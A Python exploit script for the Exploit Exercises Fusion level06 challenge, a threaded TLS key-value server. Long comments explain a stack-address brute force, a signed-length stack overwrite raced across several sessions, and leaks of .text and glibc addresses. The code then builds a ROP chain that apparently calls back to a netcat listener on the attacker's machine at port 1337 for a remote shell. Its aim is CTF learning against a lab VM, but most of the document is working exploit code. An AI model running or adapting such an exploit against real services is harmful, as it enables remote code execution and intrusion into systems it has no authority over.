#!/usr/bin/python3

#------------------ REALLY LONG Exploit description ---------------------#

# DISCLAIMER: The proposed solution is NOT the intended one.
# As a matter of fact, the intended solution is definitely faster and likely easier. 
# However, I decided to stick to this solution because I found it  original and I believe it is also somewhat reliable, even in
# a "real case" scenario where multiple thread come and go and the heap is likely organized seemingly in a messy and unknown way.
# As a side effect, the process to leak the first stack address is REALLY slow (and painful) with the possibility that it could
# also fail multiple times. The stack leakage process could however be faster, if using multiple threads. Everything will become 
# more clear once you understand the complete exploitation process (if you get there congrats for the patience).

# Now for the real stuff:
# The Level 06 is constituted by a threaded application that provides a key-value storage served as a web application.
# The user is given the ability to create, update, remove and get key-value pairs (you can find the complete source code
# at https://exploit-exercises.lains.space/fusion/level06/)

# There is an hint at the beginning of the description addressing the fact that the absence of any locking
# mechanism could lead to potentially critical results. However, I completely ignored the hint as the information
# leakage phase was really hard for me and I ended up relying on a really complex and slow exploit. 
# Still, this exploit seem not to be bounded to a particular heap configuration and it should be reliable, independently
# on the heap state and on how many threads there were before.

# As for every binary exploitation targeting ASLR protected binaries, there are two main ingredients to successfully carry on an attack:
#   1. an info leakage, providing the address of an instruction in the source code (preferrably the a glibc "address" or a ".text" address)
#   2. a stack (or heap) overwrite flaw, that allows us to control the return address of a given function call.
# As a side note, one may also need, depending on the situation, also some stack pivoting; this is luckily not the case, however.

# 1. Info leakage.
#    As for the first requirements, the intended solution relied on the fact that, concurrent updates to the same key-value
#    in the map could result in some info leakage.
#    Specifically, changing opportunely the size of the stored value could result in an heap realloc in a different heap address
#    and this could allow leaking heap memory. If things follow a proper order, there could be some interesting addresses
#    in the leaked memory (notice that I did not read, yet, a complete solution and I just had a glimpse of some other solutions,
#    so, my words could be slightly incorrect)
#    In the solution I found, the Info Leakage is done in 3 different steps. First, it is leaked the stack address where the command
#    to be executed is stored. Second, it is leaked the stack following the just leaked address. And third, it is leaked
#    an address inside the got.plt area (i.e., strchr address)

#    1.1 First step - Stack address Leakage.
#
#    The source code shows that the command is read inside a stack array of 512 bytes (cmdbuf) and then it is splitted
#    through the HX_split5 function inside an array of 6 pointers (args) that immediately follows the command one.
#    The HX_split5 function splits, in place, the command string and places the pointers to each piece of the command
#    inside the just mentioned 6 entries array.
#    The splitting character is " " and, if a command does not start with a space, the first entry of the array
#    would necessarily be the beginning address of the command string (keep this in mind because we will exploit this).

#    As a matter of fact, the command to be executed also depends only on the first character of the first split (e.g. 
#    a string like "gasdf key" would execute the "g"et instruction).
#    Moreover, the read operation does not terminate the buffer at the 512th position if it doesn't find '\n' or '\r'.
#    Consequently, if we search for a key with a string following the regex "g[a-zA-Z0-9]{510} ", the key that is effectively searched
#    for will be the first entry of the HX_split5 destination array, i.e. the beginning address of the command string, followed by
#    the address of the second string split, that is the end of the command string address (the first " " character is exactly
#    at the 512th position inside the command string).
#    Say the command string address is 0xdeadbeef, the memory layout when searching for the preceding string, after the
#    splitting of HX_split5, will then be:
#           "g[a-zA-Z0-9]{510}\x00\xef\xbe\xad\xde\xef\xc0\xad\xde\x00"
#            ^                    ^
#            |                    |
#         args[0]              args[1]
#
#    This means that we will be effectively searching for the key "\xef\xbe\xad\xde\xef\xc0\xad\xde".
#    Normally, this key wouldn't exist, however, we could perform a bruteforcing procedure introducing, for each address, an entry
#    having the key as the address, and then by searching the previous key. Obviously, all of them would fail but for the effective key. 
#    Now you may be thinking that this procedure is really slow, and it is, however we could speed up the process a little bit.
#    First of all, relying on the fact that the stack is 12 bits aligned, by tests on the executable it results that the low
#    12 bits of the command string address are always "0x164" and consequently the address of the split array will have "0x364" as
#    the lowest 12 bits.
#    Moreover, any address from 0xc0000000 above is reserved for kernel memory, so, we "only" have to bruteforce starting
#    from 0xbffff164 backwards. Additionally, but not implemented here, by creating multiple threads performing operations concurrently,
#    the solution could be retrieved much more quickly.

#    1.2 Second Step - ".text" address leakage.

#    Okay, say we have leaked the stack address, now we need to leak something more useful.
#    For this part, I actually used exactly the same flaw that will then be used to perform the stack overwrite for 
#    the true exploitation part.
#    As a matter of fact, this is a stack overwrite as well, although it is not yet done to take control of the executable
#    entirely.
#    
#    The exploitation procedure takes place by exploiting the gather_data function through concurrent threads of execution.
#    Specifically, if we call the gather_data by creating a new key-value pair in the map as follows:
#        's [keyname] [negative value]'
#    the parser will interprete the third parameter as a length value and will convert it to a number through the "atoi"
#    function. However, the resulting value will be a "signed" integer while the gather_data "length" parameter is of
#    type size_t, i.e., an unsigned integer.
#    This means that, if we provide a negative value, that value will be casted to an unsigned int without any
#    previous control, and, in this case, negative values will be converted to huge unsigned integers.

#    Now lets consider what happens inside the gather_data:
#    by disassembling the function through gdb we can see that the function takes the "length" argument, places
#    it in the EAX register, adds it the value 0x1e and performs and AND operation to zero out the low nibble (4 bits)
#    of the EAX register. The resulting size is then SUBTRACTED TO ESP to determine the effective data buffer length.
#    However, when providing a negative value as length,this will be casted to a huge unsigned integer as explained
#    a few lines ago. This means that, subtracting a big value to ESP, will effectively perform a register
#    overflow and the complessive result will in fact be an addition to the ESP register.
#    By carefully selecting the length parameter, we can then make the buffer area to point to interesting positions
#    to overwrite.
#    Specifically, in normal conditions, after the buffer, it is stored a pointer to the beginning of the buffer
#    itself (i.e. in position EBP-0x1c).
#    During the gnutls_record_recv cycle, at each iteration, the buffer pointer is added to the current offset
#    stored in EDX and the resulting value will be used as starting point for the gnutls_record_recv operation.
#    However, since the position of the buffer pointer is fixed (EBP-0x1c), and independent from the ESP position,
#    by properly incrementing ESP, instead of actually decrementing it, we can overwrite the
#    buffer pointer at EBP-0x1c with a pointer we desire.
#    
#    Here comes the possibility of exploitation.
#    Before delving into the details, a high level explanation is required.
#    The basic idea is to make the session for which we already leaked a pointer insert a key-value pair in which the value
#    is not an heap array but, instead, it is part of the stack following the address leaked in the first step.
#    In order to do this, we need:
#     - to control the "gather_data" return address.
#       - this requirement is needed to perform a partial overwrite of the return address, we will get there later.
#     - to control the EDI value pushed in the stack at the beginning of the gather_data function.
#     - and to create a "struct data" inside the "args" array of the keyval_thread function.
#       - the latest requirement is just because we need a stack area that is not overwritten by any value while the
#         thread is waiting for new input or just after the gather_data returns.

#    To get all things in place, we have to exploit a known stack pointer, i.e. the one leaked in step 1, and to exploit
#    the just mentioned stack overwrite so to properly control the buffer pointer and make any subsequent gnutls_record_recv
#    write in the leaked stack address.

#    First, in the same session for which we leaked a pointer during the first step, we start the creation of a new
#    key-value pair (e.g. by the command 's [key] [length]').
#    At this point we do not care of the length, we just need the key for later use.
#    While one of the threads on the server is thus waiting to get data for the just provided command, i.e.
#    in the gnutls_record_recv function, we create other 3 sessions to insert other key-value pairs.

#    There, however, we provide a negative length of -20 bytes each. This allows us to place the "buffer"
#    beginning exactly 12 bytes before the location where the buffer starting address is stored (i.e. the buffer
#    will begin at EBP-0x28 and the buffer starting address is stored in EBP-0x1c).
#    In this way, in each thread, we can overwrite exactly 12 bytes with random data and then we can provide the position
#    of the address we want to write in.

#    As for how the gnutls_record_recv works, in order to overwrite EBP-0x1c we then need to send a single TLS Record containing
#    12 random bytes and the address we want to write into, starting from the next gnutls_record_recv call.
#    As the offset to add to the pointer in EBP-0x1c will be already 16 after the overwrite, however, we need to write in EBP-0x1c
#    the target address MINUS 16 (that will be even out when EBP-0x1c content will be added to the offset).

#    Any subsequent gnutls_record_recv call will then write exactly in the address we want, instead of the buffer "reserved" 
#    in the gather_data call stack.

#    Now we have to determine which addresses to target in each of the 3 sessions instantiated.
#    First, we want that the main session ( i.e. the one in which we already leaked the stack address, that is stuck in the gather_data )
#    to have the return address point to keyval_thread+550.
#    This is possible since the keyval_thread+550 address differs from the original return address just by the low byte, thus allowing a successful
#    partial overwrite.

#    By returning to this address, what we accomplish is the fact that edi still contains the value that is popped directly during the exit phase
#    of the gather_data and a key-value insert is done without any check on errors over the gather_data function.
#    The key inserted will be exactly the [key] of the 's [key] [lenght]' in the main thread (that's why we still need it) but the data structure will
#    instead be directly EDI, i.e. a stack location.

#    Second, we have to overwrite the value that will be pop-ed inside EDI because, currently, it directly points to args[1], which is also the address
#    used as key during the HXmap_add, so, we have to increase the EDI pop-ed address at least to point to args[2].

#    Third, in the stack address that will be pointed by EDI, we have to create a suitable "data" struct, so that any subsequent "send_data" can correctly
#    send us a stack portion.

#    For all the three points we already have information about the addresses as, by leaking the stack address in the previous step, we can compute
#    where will be the return address for the gather_data function and also the EDI pushed value address.
#    Specifically, once leaked the stack address of "cmdbuf" we can compute the both addresses address as follows:
#       - gather_data_ret_address = "cmdbuf"-0x28
#       - gather_data_edi_address = gather_data_ret_address - 0x8
#    Remember that, to these values, we also have to subtract other 16 bytes for what we have just said.

#    For the third part, instead, we have to perform the following calculation:
#       - args_2_addr = "cmdbuf"+0x200+0x8
#    as the args array will be 512 bytes after "cmdbuf" and we have to skip the first two args so not to overwrite the key pointer.

#    Now for the overwriting:
#       - the first part is trivial as we have to perform two TLS record write.
#         Referring to the variables mentioned earlier, the payloads are:
#           1. 'a'*12+(gather_data_ret_address-0x10)
#           2. '\xf6' (keyval_thread+550 address low byte)
#       - the second part consists of the following two requests:
#           1. 'a'*12+(gather_data_edi_address-0x10)
#           2. args_2_addr
#       - the third part instead:
#           1. 'a'*12+(args_2_add-0x10)
#           2. "cmdbuf"+0x220+"\x10":
#               - this last part consists of "data->data" address (cmdbuf+0x220) and of "data->lenght" set to 0x10

#    Once overwritten everything, we can proceed inserting data in the main thread. It doesn't really matter the data you provide
#    as it will be all discarded once the function exits.
#    Just to recap everything, as I think it is a little bit difficult to grasp at first, when calling the gather_data, 
#    with the "length" value set to -20 the stack will be as follows:
#
#buffer:    |   random stuff            |
#           |   random stuff            |
#           |   random stuff            |
#           |   buffer address          | -> EBP-0x1c address
#           |   random stuff            |
#           |   random stuff            |
#           |   random stuff            |
#           |   random stuff            |
#           |   saved ESI               |
#           |   SAVED EDI               |
#           |   SAVED EBP               |
#           |   RET (keyval_thread+499) |
#           |   TLS session ptr         |
#           |   key address             |
#           |   data size               |

#    Down below, instead, we will have the args array.
#    Consequently, lets consider the first step. What happens here is that,after the first gnutls_record_recv, the stack will be the following:

#buffer:    |   'aaaa'                  |
#           |   'aaaa'                  |
#           |   'aaaa'                  |
#           |   main thread ret - 0x10  | -> EBP-0x1c address 
#           |   random stuff            |
#           |   random stuff            |
#           |   random stuff            |
#           |   random stuff            |
#           |   saved ESI               |
#           |   SAVED EDI               |
#           |   SAVED EBP               |
#           |   RET (keyval_thread+499) |
#           |   TLS session ptr         |
#           |   key address             |
#           |   data size               |
#    

#    After the first overwrite,in the main thread things will be as follow:
#
#           |   saved ESI               |
#           |   SAVED EDI               |
#           |   SAVED EBP               |
#           |   RET*(keyval_thread+550) |
#           |   TLS session ptr         |
#           |   key address             |
#           |   data size               |
#
#    For the second step, similarly, after the first gnutls_record_recv, the resulting stack in the secondary thread is as follows:

#buffer:    |   'aaaa'                  |
#           |   'aaaa'                  |
#           |   'aaaa'                  |
#           |   main thread EDI - 0x10  | -> EBP-0x1c address 
#           |   random stuff            |
#           |   random stuff            |
#           |   random stuff            |
#           |   random stuff            |
#           |   saved ESI               |
#           |   SAVED EDI               |
#           |   SAVED EBP               |
#           |   RET (keyval_thread+499) |
#           |   TLS session ptr         |
#           |   key address             |
#           |   data size               |
#    
#    And, after the second gnutls_record_recv of the second overwrite, we will have:

#           |   saved ESI               |
#           |   args+8**(args[2] ptr)   | -> |saved EDI points to the new "data" struct in 
#           |   SAVED EBP               |    |stack (i.e. at args+8)
#           |   RET*(keyval_thread+499) |
#           |   TLS session ptr         |
#           |   key address             |
#           |   data size               |

#    Finally, for the third overwriting thread, after the first gnutls_record_recv:

#buffer:    |   'aaaa'                  |
#           |   'aaaa'                  |
#           |   'aaaa'                  |
#           |   args+8 -0x10            | -> EBP-0x1c address 
#           |   random stuff            |
#           |   random stuff            |
#           |   random stuff            |
#           |   random stuff            |
#           |   saved ESI               |
#           |   SAVED EDI               |
#           |   SAVED EBP               |
#           |   RET (keyval_thread+499) |
#           |   TLS session ptr         |
#           |   key address             |
#           |   data size               |
#    

#    And, after the second gnutls_record_recv of the third session, the args array will be as follows:
#
#           | cmdbuf addr | key addr | cmdbuf+0x220 | 0x10 |
#                                    ^
#                                    |
#                           pop-ed EDI points here

#    So, once the main thread returns from gather_data, it will jump directly to the
#    HXmap_add function, inserting the struct data at EDI as value of the key provided.
#    
#    From studying the executable, it is possible to see that each thread, just before entering the infinite serving loop pushes the address
#    keyval_thread+9 in the stack so to put it in EBX. This is a standar procedure for Position-Independent-Executables
#    to keep track of where the functions to call in the .got.plt are stored.
#    However, this value remains in the stack even afterwards and we can leak it by retrieving the key-value pair just introduced.
#    Indeed, the data structure was purposefully crafted so to make the "data" pointer point to 544 bytes after the cmdbuf,
#    that are exactly 4 bytes earlier from the position where keyval_thread+9 is stored in the stack.

#    1.3 Third Step - ".got.plt" memory leakage.
#
#    So, now we have the address of an instruction of the executable and this could already be enough to create ROPgadgets using the executable's
#    text area. However, to make things easier for the exploitation, as the tough part was done, we can also leak the glibc version
#    (in normal CTF conditions, if you already know the glibc version in use this is not necessary however I wanted to make it as close to reality as possible).

#    Now you know the game (if you got down here and understood what I've written so far).
#    We can use the same technique as the previous one, but, this time, to leak a .got.plt memory area. 
#    Indeed, by knowing the position of the keyval_thread+9 address, we know also the position of any entry inside the .got.plt, so, we can insert
#    a new key-value pair where, this time, the struct data will have as length always a suitable size, but as "data->data" pointer
#    the pointer to a memory address inside the .got.plt. In my example I chose strchr, as it allowed to successfully identify the glibc in use (through https://libc.blukat.me/).

# 2. Stack overwrite (Exploitation phase)
#
#    Finally, if everything went as expected, it is only left to create a ROP chain and to serve it to the application.
#    Guess what, I reused exactly the same procedure as the previous two steps, as I'm lazy and after all the effort doing the info leakage I just
#    had enough of finding a cleaner memory overwrite. So, if you skipped everything but this last point, sorry for the inconvenience
#    but the real meat is just above.

import sys
import os
import socket
import struct
import time
import random

from gnutls.crypto import *
from gnutls.connection import *
from gnutls.errors import GNUTLSError


HOST = '192.168.56.103'
PORT = 20006
ret_overwrite = b"\xf6"


# Just reading bytes
def readbanner(session):
    buf = session.recv(2048)
    return buf

# Inserting the key-value pair with random data
def insertkey(session,key,size,data=None):
    buf = b"s "+key+b" "+size+b"\n"
    session.send(buf)
    if data is None:
        data = b"a"*int(size.decode("utf-8"))
    session.send(data)
    readbanner(session)

# Find the key
def findkey(session,key):
    buf=b"f "+key+b"\n"
    return send_from_string(session,buf)

# Send a raw command (either delete or find)
def send_from_string(session,string):
    session.send(string)
    response = readbanner(session)
    #print(response.decode("utf-8"))
    if response.decode("utf-8") == "// Key exists\n":
        return True
    return False


# Delete key
def delkey(session,key):
    buf = b"d "+key+b"\n"
    send_from_string(session,buf)

# Send a Update key command (without body)
def updatekey(session, key, size):
    buf = b"u "+key+b" "+size+b"\n"
    session.send(buf)

# Bruteforcing stack.
# This function is the one that performs the first step of the three required for the info leakage previously
# described. It leaks the stack address of "cmdbuf" by bruteforcing it.
# Notice that this may very well fail so you could tweak start or eventually iterate multiple times as it is
# unlikely that it will fail for consecutive rounds.

def bruteforce_stack(session, start=0xb7fff164, end=0):
    print("Using heuristic to speed up things, if not working it is suggested to revert it back to bruteforce starting from 0xbffff164.")
    del_string = b"d"+b"a"*510+b" "
    for i in range(start, end, -0x1000):
        print("Attempting: "+hex(i),end='\r')
        mid_byte=(i&0xff0000)>>16
        if mid_byte==0xa or mid_byte==0xd or mid_byte==0 or mid_byte==0x20:
            continue
        low = i
        high = i+0x200
        key = low.to_bytes(4,'little')+high.to_bytes(4,'little')
        insertkey(session,key,b"1")
        res = send_from_string(session,del_string)
        #delkey(session,key)
        if res:
            return (True,low)
    
    print("No match found, maybe it is due to the position of the middle byte.")
    return (False,)

# Create a new TLS channel
def create_new_session():
    cred = X509Credentials(None,None,[],[])
    context = TLSContext(cred)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    session = ClientSession(sock, context)
    session.connect((HOST,PORT))
    session.handshake()
    return session

# Function that performs the overwrite for the second and third step of the info leakage phase.
# It creates "s" a key of -20 bytes in size, overwrites EBP-0x1c (second send) and finally
# overwrites the ptr address content with value.

def overwrite_stack_pointer(session,ptr,value):
    session.send(b"s asdf -20\n")
    session.send(b"a"*12+struct.pack("<I",ptr))
    session.send(value)

# Real exploitation phase. It uses a process identical to overwrite_stack_pointer but
# this time it places the entire ROP chain inside ptr+0x10.

def pwn_gather_data(session, ptr, glibc_base, sockaddr_address):
    f = open("rop.txt","r")
    lines = f.readlines()
    gadgets = [x.split(" : ")[0] for x in lines]
    f.close()
    # Creating a session to overwrite the "session" gather_data return address and subsequent
    # stack addresses. This will effectively create the ROP chain in the "session" call stack.
    ret_overwrite_session = create_new_session()
    ret_overwrite_session.send(b"s asdf -20\n")
    ret_overwrite_session.send(b"a"*12+struct.pack("<I",ptr))
    session.send(b"s pwned 20\n")
    offset = glibc_base
    for gadget in gadgets:
        if "*" in gadget:
            current_gadget = sockaddr_address
        else:
            current_gadget = int(gadget,16)
            if "+" not in gadget:
                current_gadget = current_gadget+offset
        #print("Inserting: "+hex(current_gadget))
        ret_overwrite_session.send(struct.pack("<I",current_gadget))
    print("Overwriting is DONE. Sleeping to make sure writes take place...")
    time.sleep(3)
    print("Everything should be fine. Enjoy this bad solution!")
    print("It may take a while before appication calls home, wait for it...")
    session.send(b"a"*20)

# Just a random generator to avoid key collisions and make unlikely that a user
# overwrites keys (if it happens, goodbye application)

def generate_random_string(n):
    s = b""
    for i in range(n):
        s = s+random.randint(0x21,0xff).to_bytes(1,"little")
    return s

def main():
    res = ()
    while True:
        try:
            session = create_new_session()
            buf = readbanner(session)
            # Starting stack pointer leakage through bruteforce. This may take a while and multiple attempts
            # and this is why it is in a "while True" construct. Each time it creates a new thread on the server
            # so it is unlikely that, if the first misses, the second one will too (approx. 4/256 possibilities each time)
            res = bruteforce_stack(session)
            if res[0]:
                break
            print("Trying again. This may take a while...")
            session.close()
        except GNUTLSError as e:
            print(('Connection failed: {}'.format(e)))
            sys.exit(1)
    print("Found stack address: "+hex(res[1]))
    # print("Ready to overwrite.")
    # ESI = cmdbuf address
    esi = res[1]
    # EDI = ESI + 0x200 = args address
    edi = esi + 0x200
    # subtracting 0x28 to get to the stack address where is stored the stack return address and 0x10 because 
    # we have already written 16 bytes to get to that point (i.e. offset will already be 16).
    ret = esi-0x28-0x10
    pop_edi = ret-8
    edi_overwrite = edi-0x8
    data_struct_ptr = edi+0x8
    stack_to_leak = edi + 0x20
    # Creating new key-value couple. The value and size do not matter, as they will be overwritten in order to point directly to the 
    # stack address of the thread attached. This will allow to leak the address of keyval_thread+9 and from there, of $ebx.
    # First we generate a random string of 10 characters to use as key so to avoid breaking everything in multiple runs.
    anti_crash_string = generate_random_string(10)
    print("The key is 'leakme"+''.join(["\\x%02x" %i for i in anti_crash_string])+"'")
    session.send(b"s leakme"+anti_crash_string+b" 20")
    # Creating session to perform partial overwrite of the "session" gather_data return address with "\xf6", i.e. ret_overwrite
    ret_overwrite_session = create_new_session()
    overwrite_stack_pointer(ret_overwrite_session,ret,ret_overwrite)
    # Creating session to perform creation of the EDI "struct data"
    edi_overwrite_session = create_new_session()
    overwrite_stack_pointer(edi_overwrite_session,edi_overwrite, struct.pack("<I",stack_to_leak)+struct.pack("<I",0x10))
    # Creating session to overwrite saved EDI address and make it point to the "struct data" generated at the previous step
    pop_edi_overwrite_session = create_new_session()
    overwrite_stack_pointer(pop_edi_overwrite_session,pop_edi, struct.pack("<I",data_struct_ptr))
    # Completing the key-value of original session by sending spurious data.
    # Sleeping to make sure write is done.
    print("Waiting to give time for the other connections to overwrite...")
    time.sleep(3)
    session.send(b"a"*20)
    readbanner(session)
    # Now getting the just introduced key.
    leak_session = create_new_session()
    readbanner(leak_session)
    while True:
        leak_session.send(b"g leakme"+anti_crash_string)
        outcome = readbanner(leak_session)
        if outcome != b"// Key was not found\n":
            break
    stack = readbanner(leak_session)
    # The keyval_thread+9 address is stored 4 bytes after the beginning of the data returned by the application
    keyval_thread_9_addr = struct.unpack("<I",stack[4:8])[0]
    # Position of the got.plt strchr address.
    strchr_got_ptr = keyval_thread_9_addr + 0x20e3 + 0xc0
    glibc_anti_crash_string = generate_random_string(10)
    print("Glibc leaking key: 'leak_glibc"+''.join(['\\x%02x' %i for i in glibc_anti_crash_string])+"'")
    session.send(b"s leak_glibc"+glibc_anti_crash_string+b" 20")
    # Creating session to perform partial overwrite of the "session" gather_data return address with "\xf6", i.e. ret_overwrite
    ret_overwrite_session = create_new_session()
    overwrite_stack_pointer(ret_overwrite_session, ret, ret_overwrite)
    # Creating session to perform creation of the EDI "struct data" ("data->data" points to strchr got.plt address)
    edi_overwrite_session = create_new_session()
    overwrite_stack_pointer(edi_overwrite_session, edi_overwrite, struct.pack("<I", strchr_got_ptr)+struct.pack("<I",0x10))
    # Creating session to overwrite saved EDI address and make it to the "struct data" generated at the previous step
    pop_edi_overwrite_session = create_new_session()
    overwrite_stack_pointer(pop_edi_overwrite_session, pop_edi, struct.pack("<I", data_struct_ptr))
    print("Waiting to give time for the other connections to overwrite...")
    time.sleep(5)
    session.send(b"a"*20)
    while True:
        leak_session.send(b"g leak_glibc"+glibc_anti_crash_string)
        outcome = readbanner(leak_session)
        print(outcome)
        if outcome !=b"// Key was not found\n":
            break
    got_values = readbanner(leak_session)
    # Got the glibc strchr address
    strchr = struct.unpack("<I", got_values[:4])[0]
    print("strchr() starting at :"+hex(strchr))
    glibc_base = strchr - 0x075b40
    # The stack return address is exactly "ret+0x10" where ret is the address that was used before to perform the low byte overwrite
    # This is just the real saved return address of gather_data as "ret" was decremented by 16 due to "offset" alignment.
    stack_ret_address = ret+0x10
    # struct sockaddr of the destination is 116 bytes after the first return address (i.e., at the end of the ROP gadget chain)
    sockaddr_address = stack_ret_address+0x7c
    print("Default address is 192.168.56.1.\nIf you have to change it, look at the last line of the 'rop.txt' file.")
    input("Time to open your netcat port 1337. Press ENTER when ready...")
    pwn_gather_data(session, ret, glibc_base, sockaddr_address)

if __name__ == '__main__':
    main()
